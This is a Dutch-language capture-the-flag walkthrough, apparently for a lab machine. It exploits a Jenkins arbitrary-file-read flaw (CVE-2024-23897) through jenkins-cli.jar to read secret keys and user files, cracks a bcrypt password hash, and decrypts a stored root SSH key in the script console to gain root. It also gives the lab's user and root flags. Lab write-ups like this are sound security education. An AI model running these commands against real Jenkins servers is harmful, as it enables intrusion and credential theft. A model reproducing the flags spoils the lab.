
 Eerst ben ik gaan kijken welke poorten en services er allemaal open stonden.

```
nmap -p- -sCV 10.129.230.220 -vvvv
```

![image-20250113-175635.png](81920003.png)

Dan heb ik gezien dat er 2 poorten/services openstonden. Dit zijn de volgende services en poorten die dat er openstonden.

```
port 22: ssh

port 8080: http
```

Als we gaan kijken op de webbrowser naar de volgende url “[http://10.129.230.220:8080](http://10.129.230.220:8080)“ Dan zal je kunnen zien dat we op een jenkins pagina terecht zijn gekomen.

Rechts onderaan kunnen we de versie vinden van jenkins. We gaan voor deze versie dus ook een exploit gaan zoeken.

![image-20250113-175935.png](81920012.png)

Dit is de exploit dat ik heb gevonden [https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897](https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897).

Vooraleer dat we de commando’s zullen kunnen gaan uitvoeren moeten we eerst nog de jenkins-cli.jar gaan downloaden. Ik heb dit gedaan aan de hand van het volgende commando:

```
wget http://10.129.230.220:8080/jnlpJars/jenkins-cli.jar
```

Nu dat dit hier is gedownload, kan je dus aan de hand van de volgende commando’s belangrijke data gaan achterhalen zoals usernames, password hashes, home directory, secret/master.key,

```
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http help 1 "@/proc/self/environ" <vinden van de home directory>
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http help 1 "@/var/jenkins_home/secret.key"
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http help 1 "@/var/jenkins_home/secrets/master.key"
```

Met dezer commando’s heb ik dan ook de eerste user flag kunnen achterhalen. Dit aan de hand door het volgende commando:

user flag: a77fb6f165c300ab37028dfceb8760dc

```
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node "@/var/jenkins_home/user.txt"
```

![image-20250113-180711.png](81887246.png)

Dan ben ik gaan zoeken met behulp van de volgende pagina ben ik opzoek gegaan naar de users.xml en de config.xml files. [https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa?source=post_page-----143ad7fde347--------------------------------](https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa?source=post_page-----143ad7fde347--------------------------------)

de users.xml file kan je vinden door het volgende commando uittevoeren:

```
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node "@/var/jenkins_home/users/users.xml"
```

![image-20250113-181025.png](81920025.png)

de config.xml file zou je kunnen vinden aan de hand van de volgende code:

```
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
```

![image-20250113-181308.png](81887254.png)

Hieronder kan je zien dat we een hash hebben gevonden. We zullen deze in een bcrypt decrypter gaan steken zodat we die hash dan weer kunnen gaan gebruiken voor het wachtwoord van de user jennifer kunnen gaan achterhalen.

```
jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a <Hash voor in de decryptere>
```

![image-20250113-181423.png](81887260.png)

zoals je kan zien heb ik de hash van daarboven nu in de derypter gestoken en kan je zien dat er in de output een hash te zien is.

![image-20250113-181636.png](81887267.png)

Deze zullen we gaan gebruiken voor deze te gaan decrypteren aan de hand van john of hashcat.

![image-20250113-181753.png](81788942.png)

Nu kunnen we zien dat de username “jennifer“ is en het password “princess“ is.

We kunnen nu dus aan de hand daarvan gaan inloggen op de jenkins pagina.

![image-20250113-182452.png](81788948.png)

Als we nu is gaan navigeren naar Manage Jenkins → credentials → System → Global Credentials (unrestricted) → root, daar zullen we Concealed for Confidentiality zien staan. als we daarop gaan inspecteren zullen we en private key zien staan.

![[Pasted image 20250122145144.png]]

met deze private key gaan we naar de script console gaan en zullen we deze gaan decrypteren. Dit zal gebeuren aan de hand van het volgende commando:

```
println(hudson.util.Secret.decrypt("{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}"))
```

als we deze nu gaan uitvoeren dan zullen we de id_rsa key van de root user krijgen.

![image-20250113-191405.png](81887282.png)

van deze key gaan we nu een id_rsa file maken en deze key erin plaatsen. Daarna zullen we de file andere rechten gaan maken aan de hand van het volgende commando:

```
sudo chmod 600 id_rsa
```

![[Pasted image 20250122145218.png]]

dan gaan we nu gaan inloggen aan de hand van het volgende commando

```
sudo ssh root@10.129.230.220 -i id_rsa
```

![image-20250113-191602.png](81887294.png)

daar hebben we nu de root flag:

root flag: dce8a66129b48a197339b21e3f8a4a80

![image-20250113-191642.png](81920054.png)

Hierbij is de machine nu gehacked.

![image-20250113-191706.png](81821727.png)
